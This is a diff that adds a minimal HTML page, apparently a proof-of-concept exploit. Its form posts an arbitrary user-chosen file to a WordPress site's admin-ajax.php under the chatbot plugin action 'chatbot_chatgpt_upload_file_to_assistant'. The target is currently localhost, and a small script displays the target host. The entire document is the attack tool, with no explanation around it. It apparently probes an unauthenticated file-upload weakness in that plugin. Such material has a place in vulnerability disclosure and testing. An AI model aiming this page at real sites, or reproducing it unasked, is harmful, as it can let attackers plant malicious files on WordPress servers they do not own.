@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Naxtarrr</title>
+  </head>
+  <body>
+    <p>Current Site: <span id="site"></span></p>
+    <form
+      method="post"
+      action="http://localhost/wp-admin/admin-ajax.php"
+      enctype="multipart/form-data"
+      target="_blank"
+    >
+      <input type="hidden" name="action" value="chatbot_chatgpt_upload_file_to_assistant" />
+      <input type="file" name="file" />
+      <input type="submit" value="Upload" />
+    </form>
+
+    <script>
+      const url = document.querySelector("form").getAttribute("action");
+      const current = new URL(url);
+
+      const site = document.getElementById("site");
+      site.innerText = current.hostname;
+    </script>
+  </body>
+</html>
